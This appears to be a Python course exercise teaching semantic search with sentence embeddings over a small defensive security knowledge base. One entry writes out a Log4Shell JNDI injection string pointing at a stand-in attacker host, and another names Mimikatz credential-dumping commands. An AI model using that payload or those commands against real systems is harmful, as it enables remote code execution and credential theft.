# =============================================================================
# LESSON 4.2 | WORKSHOP | Exercise 3 of 3
# Semantic Search over a Security Knowledge Base
# =============================================================================
# WHAT YOU WILL LEARN
# -------------------
# - How to build a two-phase semantic search engine: index once, query fast
# - How cosine similarity ranking works on a document corpus
# - Why semantic search beats keyword search for security investigation
#
# RUN THIS FILE
# -------------
#   python module4_genai/lesson2_huggingface/workshop/exercise3_semantic_search.py
# =============================================================================

import numpy as np
from sklearn.metrics.pairwise import cosine_similarity
from sentence_transformers import SentenceTransformer

# Security knowledge base — 6 documents
KNOWLEDGE_BASE = [
    {
        "id": "log4shell",
        "title": "CVE-2021-44228 Log4Shell",
        "text": (
            "Critical RCE in Apache Log4j2. Attack vector: inject ${jndi:ldap://attacker/x} "
            "into any logged field. No authentication required. Remediation: upgrade to 2.17.1+. "
            "Detection: outbound LDAP from app servers, jndi patterns in HTTP headers and User-Agent."
        ),
    },
    {
        "id": "mimikatz",
        "title": "Mimikatz Credential Theft",
        "text": (
            "Extracts plaintext passwords and NTLM hashes from Windows LSASS memory. "
            "Techniques: sekurlsa::logonpasswords, lsadump::dcsync, Golden Ticket attacks. "
            "Detection: LSASS memory access by non-system processes (Sysmon Event 10). "
            "Mitigations: Credential Guard, disable WDigest, Protected Users group."
        ),
    },
    {
        "id": "ransomware_response",
        "title": "Ransomware Incident Response Playbook",
        "text": (
            "Phase 1 (0-30 min): Confirm indicators, identify Patient Zero, assess blast radius. "
            "Phase 2: Isolate via VLAN, do NOT shutdown. Disable accounts, block C2 at perimeter. "
            "Phase 3: Remove persistence, reset all credentials, patch initial access vector. "
            "Phase 4: Restore from clean backups, prioritise critical systems, monitor for re-infection."
        ),
    },
    {
        "id": "lateral_movement",
        "title": "Lateral Movement Detection",
        "text": (
            "Detect lateral movement with: SMB authentication anomalies (Event 4624 type 3), "
            "unusual RDP connections, PsExec or WMI remote execution, Pass-the-Hash indicators. "
            "Baseline normal admin behaviour first. Alert on admin tools appearing on non-admin hosts."
        ),
    },
    {
        "id": "phishing",
        "title": "Phishing Email Analysis",
        "text": (
            "Identify phishing by checking: SPF/DKIM/DMARC alignment, sender domain age, "
            "URL redirect chains, attachment hashes against VirusTotal. "
            "Spear-phishing uses OSINT from LinkedIn and social media to target specific individuals."
        ),
    },
    {
        "id": "network_segmentation",
        "title": "Network Segmentation for Defence",
        "text": (
            "Segment networks to limit blast radius: DMZ for internet-facing services, "
            "separate VLAN for OT/ICS systems, isolated network for domain controllers. "
            "Implement zero-trust: verify every request, assume breach mentality. "
            "Microsegmentation with host-based firewall rules prevents lateral movement."
        ),
    },
]

QUERIES = [
    "how do I detect mimikatz credential dumping?",
    "what should I do when ransomware hits?",
    "how to prevent attackers from moving between systems?",
]

# =============================================================================
# BACKGROUND
# =============================================================================
# Phase 1 (indexing): encode all KB texts once → kb_embeddings (6, 384)
# Phase 2 (query):    encode query → (1, 384)
#                     cosine_similarity → scores per document
#                     return top-k by score

# =============================================================================
# TASK 1 — Load model and index the knowledge base
# =============================================================================
# Load SentenceTransformer("all-MiniLM-L6-v2").
# Extract texts:  kb_texts = [doc["text"] for doc in KNOWLEDGE_BASE]
# Encode:         kb_embeddings = model.encode(kb_texts)
#
# Print:
#   "Indexed 6 documents."
#   "Embedding matrix shape: (6, 384)"
#
# EXPECTED OUTPUT:
#   Indexed 6 documents.
#   Embedding matrix shape: (6, 384)

# >>> YOUR CODE HERE


# =============================================================================
# TASK 2 — Implement the search function
# =============================================================================
# Write: search(query, top_k=3) -> list of (score, doc) tuples
#
#   1. Encode: query_emb = model.encode([query])           # shape: (1, 384)
#   2. Scores: sims = cosine_similarity(query_emb, kb_embeddings)[0]  # shape: (6,)
#   3. Sort:   top_indices = np.argsort(sims)[::-1][:top_k]
#   4. Return: [(float(sims[i]), KNOWLEDGE_BASE[i]) for i in top_indices]

# >>> YOUR CODE HERE


# =============================================================================
# TASK 3 — Run all 3 queries and print ranked results
# =============================================================================
# For each query in QUERIES:
#   results = search(query, top_k=3)
#   Print:
#     "\nQuery: [query]"
#     "  0.8923 | [doc title]"
#     "  0.6102 | [doc title]"
#     "  0.4234 | [doc title]"
#
# EXPECTED OUTPUT (approximate):
#   Query: how do I detect mimikatz credential dumping?
#     0.8923 | Mimikatz Credential Theft
#     0.6102 | Lateral Movement Detection
#     0.4234 | Network Segmentation for Defence

# >>> YOUR CODE HERE


# =============================================================================
# TASK 4 — Threshold filtering (BONUS)
# =============================================================================
# Add a `min_score=0.0` parameter to search().
# Only return results where score >= min_score.
#
# Call: search("what is network segmentation?", top_k=6, min_score=0.4)
# Print how many documents pass the threshold.

# >>> YOUR CODE HERE


print("\n--- Exercise 3 complete. Open reference_solution.py to compare. ---")
print("--- Next: module4_genai/lesson3_llm_api/workshop/1_lab_guide.md ---")
